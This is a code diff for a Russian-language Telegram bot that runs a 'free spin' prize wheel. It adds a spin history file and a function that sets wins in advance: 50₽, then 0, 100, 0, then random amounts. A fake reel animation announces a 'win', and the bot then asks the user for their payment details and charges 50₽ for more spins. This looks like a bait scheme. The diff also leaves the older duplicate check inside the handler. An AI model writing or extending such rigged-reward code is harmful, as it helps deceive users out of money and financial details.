@@ -108,6 +108,25 @@ def command_admin(message):
 @bot.callback_query_handler(func=lambda call: call.data == "free_spin")
 def handle_free_spin(call):
     uid = call.from_user.id
+    count = get_spin_count(uid)
+    if count > 0 and uid not in payment_pending:
+        bot.answer_callback_query(call.id, "❌ Бесплатная попытка уже использована. Оплати 50₽, чтобы продолжить.")
+        return
+
+    msg = bot.send_message(uid, "🔄 Крутим колесо...\n[ 🎰 🎰 🎰 ]")
+    time.sleep(1)
+    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍒 💣 🍋 ]")
+    time.sleep(1)
+    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍀 💰 🍉 ]")
+    time.sleep(1)
+
+    amount = determine_amount(uid)
+    increment_spin_count(uid)
+    code = generate_code(amount, uid)
+    user_states[uid] = {"amount": amount, "code": code}
+    bot.send_message(uid, f"🎉 ПОБЕДА {amount}₽!\nКод: `{code}`\nОтправь свои реквизиты:", parse_mode="Markdown")
+
+    uid = call.from_user.id
     if first_spin_done.get(uid):
         bot.answer_callback_query(call.id, "❌ Бесплатная попытка уже использована.")
         return
@@ -228,6 +247,38 @@ def check_webhook():
     except Exception as e:
         print(f"💥 Ошибка при проверке Webhook: {e}")
     threading.Timer(10, check_webhook).start()
+
+SPIN_HISTORY_FILE = "spin_history.json"
+
+# Загружаем историю
+if not os.path.exists(SPIN_HISTORY_FILE):
+    with open(SPIN_HISTORY_FILE, "w") as f:
+        json.dump({}, f)
+
+def get_spin_count(user_id):
+    with open(SPIN_HISTORY_FILE, "r") as f:
+        history = json.load(f)
+    return history.get(str(user_id), 0)
+
+def increment_spin_count(user_id):
+    with open(SPIN_HISTORY_FILE, "r") as f:
+        history = json.load(f)
+    history[str(user_id)] = history.get(str(user_id), 0) + 1
+    with open(SPIN_HISTORY_FILE, "w") as f:
+        json.dump(history, f, indent=4)
+
+def determine_amount(user_id):
+    count = get_spin_count(user_id)
+    if count == 0:
+        return 50
+    elif count == 1:
+        return 0
+    elif count == 2:
+        return 100
+    elif count == 3:
+        return 0
+    else:
+        return random.choice([0, 10, 25, 50, 100, 200, 500])
 
 if __name__ == '__main__':
     bot.set_my_commands([
